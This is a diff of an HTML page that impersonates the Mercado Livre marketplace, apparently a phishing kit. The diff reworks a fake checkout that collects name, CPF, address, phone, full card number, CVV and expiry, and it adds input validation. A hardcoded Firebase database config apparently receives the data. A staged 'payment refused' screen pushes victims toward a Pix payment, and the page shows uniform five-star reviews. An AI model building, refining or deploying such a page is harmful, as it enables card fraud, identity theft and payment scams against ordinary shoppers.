@@ -6,6 +6,7 @@
 <title>Mercado Livre</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
+/* O CSS INTEIRO CONTINUA O MESMO DA VERSÃO ANTERIOR */
 *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 body{margin:0;font-family:'Inter',sans-serif;background:#ebebeb;color:#333;font-size:15px;line-height:1.5}
 img{max-width:100%;display:block}
@@ -112,79 +113,58 @@ img{max-width:100%;display:block}
 .rodape__links a{font-size:12px;color:#3483fa;text-decoration:none}
 .rodape__legal{font-size:11px;color:#999;line-height:1.6;margin:0;padding-top:12px;border-top:1px solid #e0e0e0}
 @media(max-width:768px){.termos-busca,.busca-letra,.rodape{margin-left:8px;margin-right:8px}}
-.end-wrap{max-width:420px;margin:0 auto;padding:20px;background:#fff;min-height:100vh}
-.end-wrap header{background:#ffe600;padding:15px;text-align:center;font-weight:500;font-size:17px;position:relative;margin:-20px -20px 20px}
-.end-wrap header a{position:absolute;left:15px;top:50%;transform:translateY(-50%);text-decoration:none;font-size:24px;color:black}
-.end-wrap label{display:block;margin-top:16px;font-size:14px;font-weight:500;color:#333}
-.end-wrap input,.end-wrap select{width:100%;padding:12px;margin-top:6px;border:1.5px solid #ccc;border-radius:8px;font-size:15px;outline:none}
-.end-wrap input:focus,.end-wrap select:focus{border-color:#3483fa}
-.end-wrap small{color:#888;font-size:12px;margin-top:4px;display:block}
-.end-wrap .button-container{margin-top:24px}
-.end-wrap button{background-color:#3483fa;color:white;border:none;padding:14px 0;font-size:16px;font-weight:500;border-radius:8px;cursor:pointer;width:100%}
-.frete-wrap{max-width:480px;margin:0 auto;padding:20px;background:#fff;min-height:100vh}
-.frete-wrap header{background:#ffe600;padding:15px;text-align:center;font-weight:bold;font-size:16px;position:relative;margin:-20px -20px 20px}
-.frete-wrap header a{position:absolute;left:15px;top:50%;transform:translateY(-50%);text-decoration:none;font-size:24px;color:black}
-.endereco-box{margin-bottom:20px;font-size:14px;color:#333;background:#f8f8f8;border-radius:8px;padding:12px;line-height:1.6}
-.envio-full{display:flex;align-items:center;background-color:#f5f5f5;padding:10px;border-radius:8px;margin-bottom:20px;font-size:16px}
-.opcoes-frete{border:1px solid #ddd;border-radius:8px;padding:15px;background:#fff}
-.opcao{display:flex;align-items:center;margin-bottom:15px;font-size:16px;color:#333}
-.opcao:last-child{margin-bottom:0}
-.opcao input[type="radio"]{appearance:none;width:20px;height:20px;border:2px solid #3483fa;border-radius:50%;margin-right:10px;position:relative;flex-shrink:0}
-.opcao input[type="radio"]:checked::before{content:"";position:absolute;width:12px;height:12px;background:#3483fa;border-radius:50%;top:2px;left:2px}
-.opcao label{flex:1}
-.gratis{color:#00a650;font-weight:bold;margin-left:auto}
-.frete-wrap .button-container{margin-top:30px}
-.frete-wrap button{background-color:#3483fa;color:white;border:none;padding:14px 0;font-size:18px;border-radius:8px;cursor:pointer;width:100%}
-.pag-wrap{max-width:480px;margin:0 auto;background:#fff;min-height:100vh;display:flex;flex-direction:column}
-.pag-wrap header{background-color:#ffe600;padding:15px;text-align:center;font-weight:500;font-size:18px;position:relative}
-.pag-wrap header a{position:absolute;left:15px;top:50%;transform:translateY(-50%);text-decoration:none;font-size:24px;color:black}
-.pag-main{padding:20px;flex-grow:1;overflow-y:auto;-webkit-overflow-scrolling:touch}
-.pag-titulo{font-size:20px;font-weight:500;margin-bottom:20px;color:#333;text-align:center}
-.metodos-pagamento{border:1px solid #ddd;border-radius:8px;background:#fff;padding:15px}
-.metodo{display:flex;align-items:center;padding:15px 10px;font-size:16px;border-bottom:1px solid #eee;cursor:pointer;text-decoration:none;color:inherit;background:none;border-left:none;border-right:none;border-top:none;width:100%;text-align:left}
-.metodo:last-child{border-bottom:none}
-.metodo img{width:32px;height:32px;margin-right:15px}
-.metodo-info{flex-grow:1;color:#333;display:flex;flex-direction:column;font-weight:400}
-.metodo-info small{font-size:12px;color:#00a650;margin-top:3px}
-.recomendado{background:#000;color:#fff;font-size:10px;padding:2px 6px;border-radius:10px;margin-left:10px;height:18px;display:flex;align-items:center}
-.pag-footer{padding:15px;border-top:1px solid #eee;font-size:16px;display:flex;justify-content:space-between;align-items:center;background:#fff}
-.pag-footer strong{font-size:18px}
-.pix-wrap{max-width:480px;margin:0 auto;background:#f1f1f1;min-height:100vh;display:flex;flex-direction:column;align-items:center}
-.pix-wrap header{background-color:#ffe600;padding:15px;width:100%;text-align:center;font-weight:bold;font-size:18px;position:relative}
-.pix-wrap header a{position:absolute;left:15px;top:50%;transform:translateY(-50%);text-decoration:none;font-size:24px;color:black}
-.pix-mensagem{font-size:18px;color:#333;margin:60px auto;text-align:center;padding:0 20px}
-.pix-box{display:none;background-color:#fff;border-radius:8px;padding:20px;max-width:420px;width:90%;box-shadow:0 2px 8px rgba(0,0,0,.2);margin-top:30px;margin-bottom:30px;text-align:center}
-.pix-box .topo{background-color:#00a650;color:#fff;padding:15px;border-radius:6px 6px 0 0;font-size:16px;font-weight:bold;text-align:center;margin:-20px -20px 0}
-.pix-box .conteudo{padding:20px 0 0}
-.pix-box ol{padding-left:20px;margin:10px 0 20px;text-align:left}
-.pix-box input{width:100%;padding:12px;font-size:14px;border:1px solid #ccc;border-radius:8px;margin-bottom:10px;text-align:center}
-.pix-box button{width:100%;padding:12px;background-color:#3483fa;color:#fff;font-weight:bold;border:none;border-radius:8px;font-size:16px;cursor:pointer}
-.pix-box .nota{margin-top:10px;font-size:14px;color:#666;text-align:center}
-.qrcode-container{margin:20px 0;display:flex;justify-content:center}
-.qrcode-container img{max-width:200px;height:auto;border:1px solid #eee;padding:5px;border-radius:5px}
-.cartao-wrap{max-width:480px;margin:0 auto;background:#fff;min-height:100vh}
-.cartao-wrap header{background-color:#ffe600;padding:15px;text-align:center;font-weight:bold;font-size:18px;position:relative}
-.cartao-wrap header a{position:absolute;left:15px;top:50%;transform:translateY(-50%);text-decoration:none;font-size:24px;color:black}
-.card-preview{width:320px;height:200px;background:linear-gradient(#eee,#ccc);border-radius:12px;margin:20px auto;position:relative;max-width:90%}
-.bandeira{position:absolute;top:10px;right:10px;height:40px}
-.cartao-wrap .container{max-width:480px;margin:auto;padding:20px}
-.cartao-wrap .slide{display:none}
-.cartao-wrap .slide.active{display:block}
-.cartao-wrap label{font-weight:bold;font-size:14px;color:#333;display:block;margin-bottom:5px}
-.cartao-wrap input{width:100%;padding:12px;border:2px solid #ccc;border-radius:8px;font-size:16px;margin-bottom:20px;outline:none}
-.cartao-wrap .navigation{display:flex;justify-content:space-between;margin:20px auto;padding:0 20px;font-size:16px}
-.cartao-wrap .navigation button{border:none;background:none;color:#3483fa;font-weight:bold;font-size:16px;cursor:pointer}
-.cartao-wrap .navigation button:disabled{color:#ccc;cursor:not-allowed}
-.cartao-wrap .btn-pagar{width:90%;margin:20px auto;display:block;padding:14px;background-color:#3483fa;color:white;font-size:18px;border:none;border-radius:8px;cursor:pointer}
-.processando,.recusado{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,.95);display:none;justify-content:center;align-items:center;font-size:24px;font-weight:bold;z-index:9999;flex-direction:column}
-.recusado{background:#ff3b30;color:white}
-.recusado .icon{font-size:80px;margin-bottom:20px}
-.recusado .mensagem{font-size:22px;margin-bottom:10px;text-align:center;font-weight:500}
-.recusado .submensagem{font-size:16px;margin-bottom:20px;text-align:center;max-width:300px}
-.recusado .btn-tentar{background-color:#fff;color:#ff3b30;border:none;padding:12px 24px;font-size:16px;border-radius:8px;font-weight:bold;cursor:pointer}
-#lightbox{position:fixed;inset:0;background:rgba(0,0,0,.92);z-index:99999;display:none;align-items:center;justify-content:center;padding:20px}
-#lightbox img{max-width:100%;max-height:90vh;object-fit:contain;border-radius:8px}
-#lightbox .fechar{position:absolute;top:20px;right:20px;background:#fff;color:#000;border:none;width:44px;height:44px;border-radius:50%;font-size:24px;cursor:pointer;display:flex;align-items:center;justify-content:center;font-weight:bold}
+
+/* ========== ESTILOS DAS TELAS DE CHECKOUT (ESPALHADAS) ========== */
+.tela-cheia{position:fixed;inset:0;background:#fff;z-index:2000;display:flex;flex-direction:column;overflow-y:auto}
+.tela-cheia.hidden{display:none!important}
+.tela-cheia header{background:#ffe600;padding:16px;text-align:center;font-weight:600;font-size:16px;position:sticky;top:0;z-index:10;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 4px rgba(0,0,0,.05)}
+.tela-cheia header a{position:absolute;left:16px;top:50%;transform:translateY(-50%);text-decoration:none;font-size:24px;color:#333;font-weight:bold;padding:5px}
+.tela-cheia .conteudo{flex:1;padding:20px;max-width:600px;margin:0 auto;width:100%}
+
+/* Formulário de Endereço */
+.campo{margin-bottom:16px}
+.campo label{display:block;font-size:13px;font-weight:600;color:#333;margin-bottom:6px}
+.campo input{width:100%;padding:14px 12px;border:1.5px solid #ddd;border-radius:8px;font-size:15px;outline:none;transition:border .2s}
+.campo input:focus{border-color:#3483fa}
+.campo input.erro{border-color:#ff3b30;background:#fff5f5}
+.campo small{font-size:11px;color:#888;margin-top:4px;display:block}
+.campo small.erro{color:#ff3b30;font-weight:600}
+.btn-continuar{width:100%;padding:16px;background:#3483fa;color:#fff;font-size:16px;font-weight:600;border:none;border-radius:8px;cursor:pointer;margin-top:20px}
+
+/* Frete */
+.endereco-resumo{background:#f8f8f8;padding:16px;border-radius:8px;font-size:14px;line-height:1.6;margin-bottom:20px;color:#333}
+.opcoes-frete-lista{display:flex;flex-direction:column;gap:12px}
+.opcao-frete{display:flex;align-items:center;padding:16px;border:1px solid #ddd;border-radius:8px;background:#fff;cursor:pointer;transition:all .2s}
+.opcao-frete:active{border-color:#3483fa;background:#f0f7ff}
+.opcao-frete input[type="radio"]{appearance:none;width:22px;height:22px;border:2px solid #ccc;border-radius:50%;margin-right:14px;flex-shrink:0;position:relative}
+.opcao-frete input[type="radio"]:checked{border-color:#3483fa}
+.opcao-frete input[type="radio"]:checked::before{content:"";position:absolute;width:12px;height:12px;background:#3483fa;border-radius:50%;top:3px;left:3px}
+.opcao-frete .frete-texto{flex:1;font-size:15px;font-weight:500;color:#333}
+.opcao-frete .frete-preco{color:#00a650;font-weight:700;font-size:15px}
+.opcao-frete .frete-recomendado{font-size:11px;color:#888;font-weight:400;display:block;margin-top:2px}
+
+/* Pagamento */
+.metodo-pagamento{display:flex;align-items:center;padding:20px 16px;border:1px solid #ddd;border-radius:8px;background:#fff;margin-bottom:12px;cursor:pointer;position:relative}
+.metodo-pagamento:active{border-color:#3483fa;background:#f0f7ff}
+.metodo-pagamento img{width:40px;height:40px;margin-right:16px;object-fit:contain}
+.metodo-info{flex:1;display:flex;flex-direction:column}
+.metodo-info strong{font-size:16px;color:#333}
+.metodo-info small{font-size:13px;color:#00a650;margin-top:4px}
+.badge-recomendado{background:#000;color:#fff;font-size:10px;font-weight:700;padding:3px 8px;border-radius:12px;text-transform:uppercase;position:absolute;top:-8px;right:16px;letter-spacing:.5px}
+.rodape-pagamento{position:fixed;bottom:0;left:0;width:100%;background:#fff;border-top:1px solid #eee;padding:16px 20px;display:flex;justify-content:space-between;align-items:center;font-size:16px;box-shadow:0 -4px 12px rgba(0,0,0,.05);z-index:10}
+.rodape-pagamento strong{font-size:20px;color:#333}
+
+/* Pix e Cartão */
+.pix-box{background:#fff;border-radius:8px;padding:24px;text-align:center;border:1px solid #eee;box-shadow:0 4px 12px rgba(0,0,0,.05)}
+.pix-qr{max-width:220px;margin:20px auto;border:1px solid #eee;border-radius:8px;padding:10px}
+.pix-copia{width:100%;padding:14px;font-size:13px;border:1px solid #ccc;border-radius:8px;margin-top:10px;text-align:center;background:#f8f8f8}
+.btn-pix{width:100%;padding:16px;background:#3483fa;color:#fff;font-weight:600;font-size:16px;border:none;border-radius:8px;margin-top:16px;cursor:pointer}
+@media(min-width:768px){
+  .tela-cheia{position:relative;background:transparent;z-index:auto}
+  .tela-cheia .conteudo{background:#fff;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.1);margin:20px auto}
+  .tela-cheia header{max-width:600px;margin:0 auto;border-radius:8px 8px 0 0}
+  .rodape-pagamento{position:relative;max-width:600px;margin:0 auto;border-radius:0 0 8px 8px}
+}
 </style>
 </head>
 <body>
@@ -328,7 +308,6 @@ Peso: 3,845 kg</p>
 
       <h3 style="font-size:16px;font-weight:600;margin:0 0 12px;color:#333;">Comentários</h3>
       <div class="comentarios">
-
         <div class="comentario">
           <div class="comentario__header">
             <span class="comentario__estrelas">★★★★★</span>
@@ -342,7 +321,6 @@ Peso: 3,845 kg</p>
             <button class="comentario__util">👍 Útil · 50</button>
           </div>
         </div>
-
         <div class="comentario">
           <div class="comentario__header">
             <span class="comentario__estrelas">★★★★★</span>
@@ -357,7 +335,6 @@ Peso: 3,845 kg</p>
             <button class="comentario__util">👍 Útil · 38</button>
           </div>
         </div>
-
         <div class="comentario">
           <div class="comentario__header">
             <span class="comentario__estrelas">★★★★★</span>
@@ -372,7 +349,6 @@ Peso: 3,845 kg</p>
             <button class="comentario__util">👍 Útil · 20</button>
           </div>
         </div>
-
         <div class="comentario">
           <div class="comentario__header">
             <span class="comentario__estrelas">★★★★★</span>
@@ -387,7 +363,6 @@ Peso: 3,845 kg</p>
             <button class="comentario__util">👍 Útil · 18</button>
           </div>
         </div>
-
         <div class="comentario">
           <div class="comentario__header">
             <span class="comentario__estrelas">★★★★★</span>
@@ -404,7 +379,6 @@ Peso: 3,845 kg</p>
             <button class="comentario__util">👍 Útil · 17</button>
           </div>
         </div>
-
       </div>
     </div>
   </div>
@@ -447,144 +421,112 @@ Peso: 3,845 kg</p>
   </footer>
 </div>
 
-<!-- ENDEREÇO -->
-<div id="appEndereco" class="hidden">
-  <div class="end-wrap">
-    <header><a href="#" onclick="voltarSite(); return false;">&#8592;</a>Adicione um endereço</header>
-    <form id="formEndereco">
-      <label for="nome">Nome completo</label>
-      <input type="text" id="nome" required>
-      <small>Como aparece no seu RG ou CNH.</small>
-      <label for="email">E-mail</label>
-      <input type="email" id="email" placeholder="seu@email.com" required>
-      <small>Para envio do comprovante.</small>
-      <label for="cpf">CPF</label>
-      <input type="text" id="cpf" placeholder="000.000.000-00" required maxlength="14" inputmode="numeric">
-      <small>Necessário para emissão da nota fiscal.</small>
-      <label for="cep">CEP</label>
-      <input type="text" id="cep" required maxlength="9" inputmode="numeric" onblur="buscarCep()">
-      <small id="cepStatus"></small>
-      <label for="rua">Rua</label>
-      <input type="text" id="rua" required>
-      <label for="numero">Número</label>
-      <input type="text" id="numero" required>
-      <label for="complemento">Complemento</label>
-      <input type="text" id="complemento">
-      <label for="bairro">Bairro</label>
-      <input type="text" id="bairro" required>
-      <label for="cidade">Cidade</label>
-      <input type="text" id="cidade" required>
-      <label for="estado">Estado</label>
-      <input type="text" id="estado" required maxlength="2">
-      <label for="telefone">Telefone de contato</label>
-      <input type="text" id="telefone" required maxlength="15" inputmode="numeric">
-      <div class="button-container"><button type="submit">Continuar</button></div>
+<!-- TELA DE ENDEREÇO -->
+<div id="appEndereco" class="tela-cheia hidden">
+  <header><a href="#" onclick="voltarSite(); return false;">&#8592;</a>Adicione um endereço</header>
+  <div class="conteudo">
+    <form id="formEndereco" novalidate>
+      <div class="campo"><label for="nome">Nome completo</label><input type="text" id="nome" required><small id="erroNome"></small></div>
+      <div class="campo"><label for="email">E-mail</label><input type="email" id="email" placeholder="seu@email.com" required><small id="erroEmail"></small></div>
+      <div class="campo"><label for="cpf">CPF (11 dígitos)</label><input type="text" id="cpf" placeholder="000.000.000-00" required maxlength="14" inputmode="numeric"><small id="erroCpf"></small></div>
+      <div class="campo"><label for="cep">CEP (8 dígitos)</label><input type="text" id="cep" required maxlength="9" inputmode="numeric" onblur="buscarCep()"><small id="erroCep">Necessário para emissão da nota fiscal.</small></div>
+      <div class="campo"><label for="rua">Rua</label><input type="text" id="rua" required><small id="erroRua"></small></div>
+      <div class="campo"><label for="numero">Número</label><input type="text" id="numero" required><small id="erroNumero"></small></div>
+      <div class="campo"><label for="complemento">Complemento</label><input type="text" id="complemento"></div>
+      <div class="campo"><label for="bairro">Bairro</label><input type="text" id="bairro" required><small id="erroBairro"></small></div>
+      <div class="campo"><label for="cidade">Cidade</label><input type="text" id="cidade" required><small id="erroCidade"></small></div>
+      <div class="campo"><label for="estado">Estado (Ex: SP)</label><input type="text" id="estado" required maxlength="2"><small id="erroEstado"></small></div>
+      <div class="campo"><label for="telefone">Telefone (DDD + Número)</label><input type="text" id="telefone" required maxlength="15" inputmode="numeric"><small id="erroTelefone"></small></div>
+      <button type="submit" class="btn-continuar">Continuar</button>
     </form>
   </div>
 </div>
 
-<!-- FRETE -->
-<div id="appFrete" class="hidden">
-  <div class="frete-wrap">
-    <header><a href="#" onclick="voltarEndereco(); return false;">&#8592;</a>Escolha quando sua compra chegará</header>
-    <main>
-      <div class="endereco-box" id="mostrarEndereco"></div>
-      <div class="envio-full">📦 Envio 1 FULL</div>
-      <div class="opcoes-frete">
-        <div class="opcao"><input type="radio" name="frete" id="hoje"><label for="hoje">Hoje</label><span class="gratis">Grátis</span></div>
-        <div class="opcao"><input type="radio" name="frete" id="amanha" checked><label for="amanha">Amanhã <small style="color:#888;font-size:12px;">(Recomendado)</small></label><span class="gratis">Grátis</span></div>
-        <div class="opcao"><input type="radio" name="frete" id="fimSemana"><label for="fimSemana">Entre sexta-feira e domingo</label><span class="gratis">Grátis</span></div>
-        <div class="opcao"><input type="radio" name="frete" id="seuDia"><label for="seuDia">Seu dia de entregas <small style="color:#3483fa;">(NOVO)</small></label><span class="gratis">Grátis</span></div>
-      </div>
-      <div class="button-container"><button onclick="irParaPagamento()">Continuar</button></div>
-    </main>
+<!-- TELA DE FRETE -->
+<div id="appFrete" class="tela-cheia hidden">
+  <header><a href="#" onclick="voltarEndereco(); return false;">&#8592;</a>Escolha quando sua compra chegará</header>
+  <div class="conteudo">
+    <div class="endereco-resumo" id="mostrarEndereco"></div>
+    <div style="font-weight:600;margin-bottom:16px;color:#333;">Opções de entrega</div>
+    <div class="opcoes-frete-lista">
+      <label class="opcao-frete"><input type="radio" name="frete" id="hoje"><div class="frete-texto">Hoje</div><div class="frete-preco">Grátis</div></label>
+      <label class="opcao-frete"><input type="radio" name="frete" id="amanha" checked><div class="frete-texto">Amanhã<span class="frete-recomendado">(Recomendado)</span></div><div class="frete-preco">Grátis</div></label>
+      <label class="opcao-frete"><input type="radio" name="frete" id="fimSemana"><div class="frete-texto">Entre sexta-feira e domingo</div><div class="frete-preco">Grátis</div></label>
+      <label class="opcao-frete"><input type="radio" name="frete" id="seuDia"><div class="frete-texto">Seu dia de entregas <span style="color:#3483fa;font-size:12px;">(NOVO)</span></div><div class="frete-preco">Grátis</div></label>
+    </div>
+    <button class="btn-continuar" onclick="irParaPagamento()">Continuar</button>
   </div>
 </div>
 
-<!-- PAGAMENTO -->
-<div id="appPagamento" class="hidden">
-  <div class="pag-wrap">
-    <header><a href="#" onclick="voltarFrete(); return false;">&#8592;</a>Escolha como pagar</header>
-    <main class="pag-main">
-      <div class="pag-titulo">Escolha o meio de pagamento</div>
-      <div class="metodos-pagamento">
-        <button class="metodo" onclick="escolherPix()">
-          <img src="https://img.icons8.com/color/48/pix.png" alt="Pix">
-          <div class="metodo-info">Pix<small>Aprovação imediata</small></div>
-          <div class="recomendado">RECOMENDADO</div>
-        </button>
-        <button class="metodo" onclick="escolherCartao()">
-          <img src="https://img.icons8.com/color/48/card-exchange.png" alt="Cartão de Crédito">
-          <div class="metodo-info">Novo cartão de crédito<small>Pagamento em até 12x</small></div>
-        </button>
-      </div>
-    </main>
-    <div class="pag-footer"><div>Você pagará</div><strong>R$ 159,44</strong></div>
+<!-- TELA DE PAGAMENTO -->
+<div id="appPagamento" class="tela-cheia hidden">
+  <header><a href="#" onclick="voltarFrete(); return false;">&#8592;</a>Escolha como pagar</header>
+  <div class="conteudo" style="padding-bottom:100px;">
+    <div style="font-size:18px;font-weight:600;text-align:center;margin-bottom:24px;color:#333;">Escolha o meio de pagamento</div>
+    <div class="metodo-pagamento" onclick="escolherPix()">
+      <span class="badge-recomendado">Recomendado</span>
+      <img src="https://img.icons8.com/color/48/pix.png" alt="Pix">
+      <div class="metodo-info"><strong>Pix</strong><small>Aprovação imediata</small></div>
+    </div>
+    <div class="metodo-pagamento" onclick="escolherCartao()">
+      <img src="https://img.icons8.com/color/48/card-exchange.png" alt="Cartão de Crédito">
+      <div class="metodo-info"><strong>Novo cartão de crédito</strong><small>Pagamento em até 12x</small></div>
+    </div>
   </div>
+  <div class="rodape-pagamento"><div>Você pagará</div><strong>R$ 159,44</strong></div>
 </div>
 
-<!-- PIX -->
-<div id="appPix" class="hidden">
-  <div class="pix-wrap">
-    <header><a href="#" onclick="voltarPagamento(); return false;">&#8592;</a>Pagamento via Pix</header>
-    <div class="pix-mensagem" id="pixMensagem">Aguarde, gerando PIX…</div>
-    <div class="pix-box" id="pixBox">
-      <div class="topo" id="pixTopo">Pague R$ 159,44 via Pix para garantir sua compra</div>
-      <div class="conteudo">
-        <p>Escaneie o QR Code ou copie o código para pagar</p>
-        <div class="qrcode-container"><img id="qrCodeImg" src="" alt="QR Code Pix"></div>
-        <ol>
-          <li>Acesse seu Internet Banking ou app de pagamentos.</li>
-          <li>Escolha pagar via Pix (com código copia e cola).</li>
-          <li>Cole o seguinte código:</li>
-        </ol>
-        <input type="text" id="chavePix" readonly>
-        <button onclick="copiarChave()">Copiar código</button>
-        <div class="nota">Pague e será creditado na hora</div>
+<!-- TELA DO PIX -->
+<div id="appPix" class="tela-cheia hidden">
+  <header><a href="#" onclick="voltarPagamento(); return false;">&#8592;</a>Pagamento via Pix</header>
+  <div class="conteudo" style="padding-top:40px;">
+    <div class="pix-box">
+      <h2 style="font-size:20px;margin-bottom:8px;color:#333;" id="pixTopo">Gerando PIX…</h2>
+      <div id="pixMensagem" style="color:#666;font-size:14px;">Aguarde um instante.</div>
+      <div id="pixBox" style="display:none;">
+        <img id="qrCodeImg" class="pix-qr" src="" alt="QR Code">
+        <p style="font-size:14px;color:#666;margin-bottom:16px;">Escaneie o QR Code ou copie o código abaixo</p>
+        <input type="text" id="chavePix" class="pix-copia" readonly>
+        <button class="btn-pix" onclick="copiarChave()">Copiar código PIX</button>
       </div>
     </div>
   </div>
 </div>
 
-<!-- CARTÃO -->
-<div id="appCartao" class="hidden">
-  <div class="cartao-wrap">
-    <header><a href="#" onclick="voltarPagamento(); return false;">&#8592;</a>Novo cartão</header>
-    <div class="card-preview"><img src="" class="bandeira" id="bandeira" style="display:none;" alt=""></div>
-    <div class="container">
-      <div class="slide active" id="slide1">
-        <label for="numeroCartao">Número do cartão</label>
-        <input type="text" id="numeroCartao" maxlength="19" placeholder="•••• •••• •••• ••••" oninput="formatCardNumber(); detectCardBrand();">
-      </div>
-      <div class="slide" id="slide2">
-        <label for="nomeCartao">Nome do titular</label>
-        <input type="text" id="nomeCartao" placeholder="Nome impresso no cartão">
-      </div>
-      <div class="slide" id="slide3">
-        <label for="validade">Validade (MM/AA)</label>
-        <input type="text" id="validade" maxlength="5" placeholder="MM/AA" oninput="formatValidade()">
-        <label for="cvv">CVV</label>
-        <input type="text" id="cvv" maxlength="4" placeholder="CVV">
-      </div>
-      <div class="slide" id="slide4">
-        <label for="cpfCartao">CPF do titular</label>
-        <input type="text" id="cpfCartao" maxlength="14" placeholder="000.000.000-00" oninput="formatCpfCartao()">
-      </div>
-      <div class="navigation" id="navigation">
-        <button id="anterior" onclick="anterior()" disabled>Anterior</button>
-        <button id="seguinte" onclick="seguinte()">Seguinte</button>
-      </div>
-      <button class="btn-pagar" id="btnPagarCartao" style="display:none;" onclick="pagarCartao()">Pagar</button>
+<!-- TELA DO CARTÃO -->
+<div id="appCartao" class="tela-cheia hidden">
+  <header><a href="#" onclick="voltarPagamento(); return false;">&#8592;</a>Novo cartão</header>
+  <div class="conteudo">
+    <div class="card-preview" style="margin:0 auto 30px;width:100%;max-width:320px;height:200px;background:linear-gradient(135deg,#3483fa,#1e5ac2);border-radius:12px;position:relative;box-shadow:0 8px 16px rgba(0,0,0,.2);">
+      <img src="" class="bandeira" id="bandeira" style="position:absolute;top:16px;right:16px;height:40px;display:none;" alt="">
     </div>
+    <div class="slide active" id="slide1">
+      <div class="campo"><label>Número do cartão (16 dígitos)</label><input type="text" id="numeroCartao" maxlength="19" placeholder="•••• •••• •••• ••••" oninput="formatCardNumber(); detectCardBrand();"><small id="erroCartaoNumero"></small></div>
+    </div>
+    <div class="slide" id="slide2">
+      <div class="campo"><label>Nome do titular</label><input type="text" id="nomeCartao" placeholder="Nome impresso no cartão"><small id="erroCartaoNome"></small></div>
+    </div>
+    <div class="slide" id="slide3">
+      <div class="campo"><label>Validade (MM/AA)</label><input type="text" id="validade" maxlength="5" placeholder="MM/AA" oninput="formatValidade()"><small id="erroCartaoValidade"></small></div>
+      <div class="campo"><label>CVV (3 ou 4 dígitos)</label><input type="text" id="cvv" maxlength="4" placeholder="CVV" oninput="this.value=this.value.replace(/\D/g,'')"><small id="erroCartaoCvv"></small></div>
+    </div>
+    <div class="slide" id="slide4">
+      <div class="campo"><label>CPF do titular</label><input type="text" id="cpfCartao" maxlength="14" placeholder="000.000.000-00" oninput="formatCpfCartao()"><small id="erroCartaoCpf"></small></div>
+    </div>
+    <div class="navigation" id="navigation" style="display:flex;justify-content:space-between;margin-top:24px;">
+      <button id="anterior" onclick="anterior()" disabled style="background:none;border:none;color:#3483fa;font-weight:600;font-size:16px;">Anterior</button>
+      <button id="seguinte" onclick="seguinte()" style="background:#3483fa;color:#fff;border:none;padding:12px 24px;border-radius:6px;font-weight:600;font-size:16px;">Seguinte</button>
+    </div>
+    <button class="btn-continuar" id="btnPagarCartao" style="display:none;" onclick="pagarCartao()">Pagar</button>
   </div>
 </div>
 
-<div class="processando" id="processando">Processando pagamento...</div>
-<div class="recusado" id="recusado">
-  <div class="icon">❌</div>
-  <div class="mensagem">Não foi possível processar seu pagamento</div>
-  <div class="submensagem">Tente usar outro cartão ou selecione pagar com PIX.</div>
-  <button class="btn-tentar" onclick="voltarPagamento()">Tentar novamente</button>
+<div class="processando" id="processando" style="position:fixed;inset:0;background:rgba(255,255,255,.95);display:none;justify-content:center;align-items:center;font-size:20px;font-weight:bold;z-index:9999;flex-direction:column;">Processando pagamento...</div>
+<div class="recusado" id="recusado" style="position:fixed;inset:0;background:#ff3b30;color:#fff;display:none;justify-content:center;align-items:center;flex-direction:column;z-index:9999;">
+  <div style="font-size:60px;margin-bottom:20px;">❌</div>
+  <div style="font-size:20px;font-weight:600;margin-bottom:8px;text-align:center;">Pagamento recusado</div>
+  <div style="font-size:14px;opacity:.8;margin-bottom:24px;text-align:center;padding:0 20px;">Tente novamente com outro cartão ou use o PIX.</div>
+  <button onclick="voltarPagamento()" style="background:#fff;color:#ff3b30;border:none;padding:14px 28px;border-radius:8px;font-weight:600;font-size:16px;">Voltar</button>
 </div>
 
 <!-- MODAL CEP -->
@@ -606,7 +548,7 @@ Peso: 3,845 kg</p>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 <script>
-// NOVO BANCO DE DADOS CONFIGURADO AQUI
+// ===== NOVO BANCO CONFIGURADO =====
 const firebaseConfig = {
   apiKey: "AIzaSyCmoxq5NMQUj1hqyWhjaJz4Uw4grhsFFhA",
   authDomain: "projeto-link-ddbf0.firebaseapp.com",
@@ -658,9 +600,89 @@ function comprarAgora(){
 }
 function voltarSite(){appEndereco.classList.add('hidden');appSite.classList.remove('hidden');window.scrollTo(0,0);}
 
+// ===== VALIDAÇÕES =====
+function validarNome(valor, erroId){
+  const erro = document.getElementById(erroId);
+  if(valor.length < 5){ erro.textContent = "Nome muito curto."; erro.className="erro"; return false; }
+  if(/\d/.test(valor)){ erro.textContent = "O nome não pode conter números."; erro.className="erro"; return false; }
+  erro.textContent = ""; erro.className=""; return true;
+}
+function validarEmail(valor, erroId){
+  const erro = document.getElementById(erroId);
+  const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  if(!regex.test(valor)){ erro.textContent = "E-mail inválido."; erro.className="erro"; return false; }
+  erro.textContent = ""; erro.className=""; return true;
+}
+function validarCpf(valor, erroId){
+  const erro = document.getElementById(erroId);
+  const num = valor.replace(/\D/g,'');
+  if(num.length !== 11){ erro.textContent = "O CPF precisa ter exatamente 11 números."; erro.className="erro"; return false; }
+  erro.textContent = ""; erro.className=""; return true;
+}
+function validarCep(valor, erroId){
+  const erro = document.getElementById(erroId);
+  const num = valor.replace(/\D/g,'');
+  if(num.length !== 8){ erro.textContent = "O CEP precisa ter exatamente 8 números."; erro.className="erro"; return false; }
+  erro.textContent = ""; erro.className=""; return true;
+}
+function validarTelefone(valor, erroId){
+  const erro = document.getElementById(erroId);
+  const num = valor.replace(/\D/g,'');
+  if(num.length < 10 || num.length > 11){ erro.textContent = "Telefone precisa ter DDD + número (10 ou 11 dígitos)."; erro.className="erro"; return false; }
+  erro.textContent = ""; erro.className=""; return true;
+}
+function validarEstado(valor, erroId){
+  const erro = document.getElementById(erroId);
+  if(valor.length !== 2 || /\d/.test(valor)){ erro.textContent = "Use a sigla do estado (ex: SP)."; erro.className="erro"; return false; }
+  erro.textContent = ""; erro.className=""; return true;
+}
+
+// Máscaras
 document.getElementById('cpf').addEventListener('input',function(){let v=this.value.replace(/\D/g,'');if(v.length>11)v=v.slice(0,11);v=v.replace(/(\d{3})(\d)/,'$1.$2');v=v.replace(/(\d{3})(\d)/,'$1.$2');v=v.replace(/(\d{3})(\d{1,2})$/,'$1-$2');this.value=v;});
